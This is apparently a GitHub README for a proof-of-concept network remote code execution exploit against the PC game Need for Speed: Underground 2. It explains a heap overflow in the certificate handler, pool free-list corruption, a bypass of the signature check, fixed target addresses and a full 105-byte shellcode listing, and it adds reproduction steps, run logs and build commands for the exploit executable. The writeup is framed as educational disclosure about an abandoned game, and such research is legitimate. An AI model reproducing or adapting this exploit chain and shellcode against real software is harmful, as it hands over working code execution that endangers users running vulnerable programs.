# NFS Underground 2 — Network Remote Code Execution

Two remote code execution vulnerabilities discovered in Need for Speed: Underground 2 (SPEED2.EXE). This repository contains a working proof-of-concept for one of them — a single TCP packet that achieves arbitrary code execution through the game's own code. No injection, no external tools, no user interaction beyond connecting to a server.

## Vulnerabilities

| # | Vector | Description | Status |
|---|--------|-------------|--------|
| 1 | TCP certificate handler (state 0xb) | Unbounded memcpy → pool free-list corruption → DWORD shoot | **Working PoC** |
| 2 | UDP game session | Heap overflow via oversized packet | **Identified** |

## Target Binary

| | |
|---|---|
| **Binary** | SPEED2.EXE (32-bit x86 PE) |
| **SHA-256** | `8f6a9ae2c4cfa01181d2fd755d99c6f4b7103f60273908ea1de1e719dfe2a297` |
| **Image base** | `0x00400000` (fixed) |
| **ASLR** | None — every address is known at compile time |
| **DEP** | None — `/NXCOMPAT` not set, heap is executable |
| **SafeSEH** | None — no structured exception handler validation |
| **Stack cookies** | Present but irrelevant — this exploit targets the heap |
| **Online servers** | Shut down by EA in 2007 |

The complete absence of ASLR means every function, every global variable, and every IAT entry sits at a fixed, predictable address. No DEP means heap memory is executable — shellcode placed there runs directly without needing a ROP chain. These are the conditions that make a single-packet RCE possible.

---

## Vulnerability #1 — Full Technical Details

### The Network Handshake

When the player clicks "Online", the game connects to `pcnfs05.ea.com` on TCP port 20971 and begins a TLS-like authentication handshake. The game sends a 30-byte hello, and the server is expected to reply with an X.509 certificate. The game allocates a **Key Exchange (KE) buffer** of `0x88C0` bytes (35,008 bytes) on its custom heap to hold the handshake state.

### The Vulnerability: Unbounded memcpy

The certificate handler (state `0xb` in the TLS state machine) processes the server's reply. After parsing the ASN.1 certificate, it copies additional data from the packet into the KE buffer starting at offset `0x81D4`:

```
KE buffer:    0x88C0 bytes allocated
Copy starts:  KE + 0x81D4
Remaining:    0x88C0 - 0x81D4 = 0x6EC bytes (1,772 bytes)
Attacker sends: up to ~1,921 bytes of copy data
```

There is **no bounds check**. The copy length comes directly from the attacker's packet. This means the attacker can write approximately 1,900 bytes past the end of the KE buffer, directly into whatever heap structure sits next to it.

### What Gets Overwritten: The Pool Free List

The game uses a **custom pool allocator** — not the Windows heap. This allocator maintains its own metadata structures that sit directly adjacent to allocated blocks. Immediately after the KE buffer's allocation, there is a **free-list node** — a 16-byte structure that's part of the allocator's bookkeeping:

```
Free-list node layout (16 bytes):
  Offset 0x00: next     (4 bytes) — pointer to next free node
  Offset 0x04: prev     (4 bytes) — pointer to previous free node
  Offset 0x08: size     (4 bytes) — size of this free block
  Offset 0x0C: magic    (4 bytes) — always 0x44443333 for valid free nodes
```

The free list is a **circular doubly-linked list, sorted by address**. Each node points forward and backward to its neighbors. The overflow lets us replace all four fields with attacker-controlled values.

### The Pool Allocator's Free Function (FUN_0043fa50)

When a block is freed, the allocator runs through these steps in this exact order:

```
1. SET SIZE + MAGIC
   Write the block's size and magic (0x44443333) into the freed block's
   node header.

2. SORTED INSERT
   Walk the free list forward from the sentinel. Find the first node
   whose address is greater than the freed block. Insert the freed
   block BEFORE that node.

   This means:
     freed->next = found_node
     freed->prev = found_node->prev
     found_node->prev->next = freed     ← WRITE to corrupted prev
     found_node->prev = freed

3. FORWARD COALESCE
   Check if freed_block + freed_size == next_node.
   If adjacent, merge them: unlink next_node from the list.

   Unlink does:
     next_node->next->prev = next_node->prev
     next_node->prev->next = next_node->next    ← WRITE via corrupted pointers

4. BACKWARD COALESCE
   Check if prev_node + prev_size == freed_block.
   If adjacent (by 32-bit arithmetic), merge them: unlink freed_block.

   Unlink does:
     freed->next->prev = freed->prev     ← THE DWORD SHOOT
     freed->prev->next = freed->next

5. DEBUG FILL
   If the pool descriptor's debug flag is set (it is), fill the
   entire freed data area with 0xEEEEEEEE.
   Fill range: [block_start, free_node_addr + 16)
```

Each unlink operation writes 4 bytes to an address derived from the node's pointers. By controlling those pointers through the overflow, we turn the allocator's own maintenance code into an arbitrary write primitive. This is the **DWORD shoot** — a controlled 4-byte write to any writable address.

### The DWORD Shoot Target: PTR_FUN

At address `0x007FBE54` in the `.data` section (writable, fixed address, no ASLR), there is a function pointer that the pool allocator calls on every allocation:

```
PTR_FUN  = 0x007FBE54    — the pointer itself (in writable .data)
*PTR_FUN = 0x005832E0    — original value (pool alloc wrapper FUN_005832E0)
```

Every time the game allocates memory, it does `CALL [0x007FBE54]`, which jumps to whatever address is stored there. If we overwrite that stored address with the location of our shellcode, the next allocation executes our code.

### Why Backward Coalesce (Not Forward)

The exploit uses the **backward coalesce** for the final DWORD shoot, not the forward coalesce. Here's why:

The free function's steps happen in order. During **sorted insert** (step 2), the allocator writes to `corrupted_node->prev`, which clobbers the first 4 bytes at our fake prev node's address. If we put shellcode starting at byte 0, insert destroys it.

During **forward coalesce** (step 3), the unlink writes the KE block address to PTR_FUN. This is a temporary value — it's not our shellcode address.

During **backward coalesce** (step 4), the unlink overwrites PTR_FUN again — this time with our **fake prev node's address**, which IS our shellcode. This is the final write that sticks.

### Surviving the 0xEE Debug Fill

After the coalesce, the allocator fills the freed region with `0xEEEEEEEE` for debugging. The fill range covers:

```
[KE_block_start, free_node_addr + 16)
```

If we put shellcode inside this range, the fill destroys it. The solution: place the fake prev node (containing our shellcode) **32 bytes past the free node**, which is 16 bytes outside the fill boundary:

```
Fill range:   [KE_block ... free_node + 16)    ← 0xEE overwrites everything here
Shellcode at: free_node + 32                    ← 16 bytes PAST the fill, safe
```

### The Shellcode Bridge

The sorted insert step writes the KE block address to `*(fakePrevAddr)`, clobbering bytes 0-3 of our fake prev node. We can't prevent this, so we design bytes 0-11 as a **bridge** that works regardless of what gets written to bytes 0-3:

```
Byte layout of the fake prev node:

[0-3]   CLOBBER ZONE
        After insert: written with KE_block address (e.g. 0x0C4B1058)
        After backward coalesce: overwritten with 0x007FBE50
        Final bytes: 50 BE 7F 00
        Decodes as:  PUSH EAX          (50)
                     MOV ESI, imm32    (BE xx xx xx xx — consumes bytes 1-5)

[4-5]   90 90 (NOP NOP)
        These are consumed as part of MOV ESI's 4-byte immediate operand.
        ESI gets junk, which is harmless.

[6-7]   EB 04 (JMP SHORT +4)
        Jumps over bytes 8-11 (the size field that gets modified during merge).

[8-11]  Backward coalesce trigger size
        This is the value that makes fakePrev + size == KE_block (32-bit wrap).
        Gets modified during the merge, but the JMP skips over it.

[12+]   REAL SHELLCODE (105 bytes, position-independent x86)
        Execution lands here after the bridge.
```

The bridge works because `50 BE 7F 00` happens to decode as two harmless instructions (`PUSH EAX` + start of `MOV ESI`), and we pre-place NOPs and a JMP to route execution safely to byte 12.

### Certificate Validation Bypass

The game validates the certificate in two ways. Both are bypassed:

**1. CA Issuer Check**

The game compares the certificate's issuer Distinguished Name against hardcoded EA root CA fields:

```
Country:      US
State:        California
Locality:     Redwood City
Organization: Electronic Arts, Inc.
CommonName:   OTG3 Certificate Authority
```

Our crafted certificate uses these exact values, so the check passes.

**2. Signature Verification**

The game identifies the signature algorithm by its OID. The OID `1.2.840.113549.1.1.1` (rsaEncryption) maps to internal type 7 in the game's OID lookup table. The verification code then computes:

```c
type - 8  = 7 - 8  = -1    (not 0, skip first branch)
-1 - 1    = -2              (not 0, skip second branch)
// Falls through: ESI = 0
```

With ESI = 0, the code reaches a `REP CMPSB` instruction that compares ESI bytes (zero bytes). Comparing zero bytes always succeeds. **The signature is never actually checked.**

### The Complete Exploit Flow

```
ATTACKER (PoC)                              GAME (SPEED2.EXE)
═══════════════                             ═══════════════════
Listen on port 20971
                                            Player clicks "Online"
                                            Game resolves pcnfs05.ea.com → 127.0.0.1
                              ←────────     TCP connect to port 20971
                              ←────────     Send 30-byte handshake

Scan game memory for KE buffer
  (using handshake as signature)
Find adjacent free-list node
Calculate addresses for DWORD shoot
Build crafted X.509 certificate
Build overflow payload:
  - Corrupted free node pointers
  - Fake prev node with bridge
  - Position-independent shellcode

Send single TCP packet ────────→
                                            Parse packet as TLS state 0xb
                                            Decode ASN.1 certificate
                                            Issuer DN matches EA root CA ✓
                                            Signature: CMPSB compares 0 bytes ✓
                                            Unbounded memcpy from KE+0x81D4
                                            Overflow writes past KE buffer
                                            Free-list node corrupted ✓
                                            Fake prev node + shellcode written ✓

Close TCP connection  ────────→
                                            Game frees the KE buffer
                                            Pool allocator FUN_0043fa50 runs:

                                            1. SORTED INSERT
                                               Reads corrupted prev → fakePrevAddr
                                               Writes *(fakePrevAddr) = KE_block
                                               (clobbers bytes 0-3 of fake prev)

                                            2. FORWARD COALESCE
                                               KE + size == corrupted_node ✓
                                               Merges, unlinks corrupted node
                                               Writes PTR_FUN = KE_block (temporary)

                                            3. BACKWARD COALESCE
                                               fakePrev + fakeSize == KE_block ✓
                                               (32-bit integer wrap)
                                               Merges, unlinks KE
                                               Writes PTR_FUN = fakePrevAddr ← DWORD SHOOT

                                            4. DEBUG FILL
                                               Fills [KE_block, freeNode+16) with 0xEE
                                               Shellcode at freeNode+32 is SAFE ✓

                                            Next pool allocation:
                                               CALL [PTR_FUN]
                                               JMP to fakePrevAddr
                                               Bridge: PUSH EAX → MOV ESI → JMP +4
                                               → Shellcode executes

                                            Shellcode:
                                               Restores PTR_FUN to original value
                                               MessageBoxA("PWNED")
                                               ShellExecuteA("calc.exe")
                                               XOR EAX,EAX / RET
                                               Game continues running ✓
```

### Key Addresses (SPEED2.EXE)

| Address | Section | Description |
|---------|---------|-------------|
| `0x007FBE54` | `.data` (RW) | PTR_FUN — function pointer, DWORD shoot target |
| `0x005832E0` | `.text` (RX) | Original PTR_FUN value (pool alloc wrapper) |
| `0x00828154` | `.data` (RW) | Pool descriptor pointer |
| `0x0043FA50` | `.text` (RX) | Pool free function (performs the coalesce/shoot) |
| `0x00783318` | `.rdata` (R) | MessageBoxA IAT entry (used by shellcode) |
| `0x007832D4` | `.rdata` (R) | ShellExecuteA IAT entry (used by shellcode) |
| `0x44443333` | — | Pool free-list magic constant |

### KE Buffer Layout

```
Offset    Size     Description
──────    ────     ───────────
0x0000    varies   Handshake state data
0x000A    varies   Outgoing handshake data
0x4018    varies   Receive buffer (packet data stored here)
0x80A8    4        Crypto flag (0x00 → 0x10 after cert processing)
0x81D4    varies   Copy destination (UNBOUNDED — the vulnerability)
```

Total allocation: `0x88C0` bytes (35,008 bytes)
Copy starts at `0x81D4`, leaving only 1,772 bytes before the buffer ends.
Attacker sends ~1,921 bytes — overflowing 149 bytes past the boundary.

### Shellcode Details (105 bytes)

Position-independent x86, uses CALL/POP for EIP-relative addressing:

```asm
; Get current address (position-independent)
E8 00000000     CALL $+5
5B              POP EBX              ; EBX = address of this instruction

; Restore function pointer so game doesn't crash
C7 05 54BE7F00  MOV DWORD PTR [0x007FBE54], 0x005832E0
     E0325800

; Balance stack (bridge did PUSH EAX)
58              POP EAX

; MessageBoxA(0, "NFS Underground 2 RCE!", "PWNED", MB_ICONINFORMATION)
6A 40           PUSH 0x40            ; MB_ICONINFORMATION
8D 43 39        LEA EAX, [EBX+0x39] ; "PWNED"
50              PUSH EAX
8D 43 3F        LEA EAX, [EBX+0x3F] ; "NFS Underground 2 RCE!"
50              PUSH EAX
6A 00           PUSH 0               ; hWnd = NULL
A1 18337800     MOV EAX, [0x00783318]; MessageBoxA from IAT
FF D0           CALL EAX

; ShellExecuteA(0, "open", "calc.exe", 0, 0, SW_SHOW)
6A 05           PUSH 5               ; SW_SHOW
6A 00           PUSH 0               ; lpDirectory
6A 00           PUSH 0               ; lpParameters
8D 43 56        LEA EAX, [EBX+0x56] ; "calc.exe"
50              PUSH EAX
8D 43 5F        LEA EAX, [EBX+0x5F] ; "open"
50              PUSH EAX
6A 00           PUSH 0               ; hwnd
A1 D4327800     MOV EAX, [0x007832D4]; ShellExecuteA from IAT
FF D0           CALL EAX

; Clean return
33 C0           XOR EAX, EAX
C3              RET

; String data (at known offsets from EBX)
"PWNED\0"                             ; offset 0x39 from EBX
"NFS Underground 2 RCE!\0"            ; offset 0x3F from EBX
"calc.exe\0"                          ; offset 0x56 from EBX
"open\0"                              ; offset 0x5F from EBX
```

The shellcode uses the game's own IAT entries to call Windows APIs — no need to resolve function addresses manually. Since there's no ASLR, the IAT is at a fixed address.

---

## Setup & Reproduction

### Requirements

- **Windows 7/8/10/11** (any version with .NET Framework 4.0 — included by default since Windows 8)
- **Need for Speed Underground 2** (PC version, installed and working)
- **A game profile** — you need to have at least one career profile to use "Use Existing" in the Online menu. If you don't have one, start a new career first, save, then exit.

### Step 1: Redirect the Auth Server DNS

The game tries to connect to `pcnfs05.ea.com` when you click Online. Since EA shut down the servers in 2007, this goes nowhere. We redirect it to `127.0.0.1` (localhost) so the game connects to our PoC instead.

**Open your hosts file as Administrator:**

1. Press `Win + S`, type `notepad`, right-click **Notepad** → **Run as administrator**
2. File → Open → navigate to `C:\Windows\System32\drivers\etc\`
3. Change the file type dropdown from "Text Documents" to **"All Files"**
4. Open the file named `hosts`
5. Add this line at the bottom:
   ```
   127.0.0.1 pcnfs05.ea.com
   ```
6. Save and close

**Verify it works:**

Open a command prompt and run:
```
ping pcnfs05.ea.com
```
You should see `Reply from 127.0.0.1` — not a DNS error or a real EA IP.

If you still see the old address, flush the DNS cache:
```
ipconfig /flushdns
```

### Step 2: Run the PoC

1. Download `nfsu2_rce_v3.exe` from the `poc/` folder (or build from source)
2. **Double-click `nfsu2_rce_v3.exe`**
3. A console window opens showing:
   ```
   NFS Underground 2 -- Pure Network RCE PoC v3
   =============================================
   Exploit: unbounded copy -> backward coalesce DWORD shoot
   Shellcode survives 0xEE debug fill. Single TCP packet.

   [HH:MM:SS.mmm] Listening on 20971...
     Launch the game, go to Online -> Use Existing.
     Waiting for connection...
   ```
4. Leave this window open — it's waiting for the game to connect.

### Step 3: Launch the Game and Go Online

1. Launch **NFS Underground 2** normally
2. From the main menu, select **Online**
3. Select **Use Existing** (pick any career profile — it won't be modified)
4. The game will connect to the PoC server

### Step 4: Watch the Exploit

The PoC console will show the exploit chain executing in real time:

```
[HH:MM:SS] Game connected
[HH:MM:SS] Game PID 12345
[HH:MM:SS] KE at 0x0C4B1080
[HH:MM:SS] PTR_FUN = 0x005832E0 (original)
[HH:MM:SS] Free node: 0x0C4B9940 (adjacent to KE buffer)
[HH:MM:SS] Shellcode: 105 bytes (position-independent)
[HH:MM:SS] >>> SENDING EXPLOIT PACKET <<<
[HH:MM:SS] Sent 2565 bytes
[HH:MM:SS] Closing TCP to trigger KE free...
[HH:MM:SS] Monitoring PTR_FUN...
[HH:MM:SS] >>> DWORD SHOOT! PTR_FUN = 0x0C4B9960 -> SHELLCODE ADDRESS (correct!)
[HH:MM:SS] >>> PTR_FUN RESTORED -- SHELLCODE EXECUTED SUCCESSFULLY <<<
```

**On success:**
- A **MessageBox** appears with "PWNED" / "NFS Underground 2 RCE!"
- **Calculator** (calc.exe) opens — proving arbitrary execution
- The game **continues running** — the shellcode restores the function pointer

### Troubleshooting

| Problem | Solution |
|---------|----------|
| PoC says "Port 20971 in use" | Another instance is running. Close it and try again. |
| Game doesn't connect | Check `hosts` file. Run `ipconfig /flushdns`. Make sure you selected Online → Use Existing. |
| "DWORD shoot not detected" | The game crashed before the KE was freed. Restart both the PoC and the game and try again. Heap layout varies between runs. |
| Game crashes immediately | The pool layout may differ. Restart and retry — the KE buffer and free node are usually adjacent. |
| Windows Defender flags the exe | Expected for an exe that reads another process's memory. The source code is provided — review it and build from source if preferred. |

### How the PoC Finds Addresses at Runtime

The PoC uses `ReadProcessMemory` to:
1. **Find the KE buffer** — scans the game's memory for the handshake data the game sent (used as a unique signature to locate the allocation)
2. **Find the adjacent free-list node** — walks the pool allocator's free list to find the first free node after the KE buffer
3. **Monitor PTR_FUN** — polls the function pointer to detect when the DWORD shoot fires

**These reads are for address discovery and logging only.** They don't modify the game. The actual exploit is entirely within the TCP packet — the game's own code does the overflow, the coalesce, the pointer overwrite, and the jump to shellcode.

In a real attack, the attacker could predict the heap layout (it's deterministic and consistent across runs) or use heap grooming to ensure the right adjacency. The `ReadProcessMemory` calls would not be needed.

### Removing the DNS Redirect

When you're done testing, remove the hosts file entry:

1. Open the hosts file as administrator (same steps as above)
2. Delete the `127.0.0.1 pcnfs05.ea.com` line
3. Save
4. Run `ipconfig /flushdns`

## Files

```
poc/
  nfsu2_rce_v3.cs    — Exploit source code (fully commented C#)
  nfsu2_rce_v3.exe   — Compiled PoC (x86, .NET Framework 4.0)
```

## Build

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /platform:x86 /out:nfsu2_rce_v3.exe nfsu2_rce_v3.cs
```

## Tools Used

- [Ghidra](https://ghidra-sre.org/) 12.1.4 via [REA](https://re-anytime.com/) — static analysis and decompilation
- Custom C# exploit (no dependencies beyond .NET Framework 4.0)

## Disclaimer

Security research against an abandoned game whose online servers were shut down in 2007. The vulnerability exists in the original unpatched binary. Published for educational purposes to demonstrate real-world heap exploitation techniques. No active online services are affected.

## License

MIT — see [LICENSE](LICENSE)
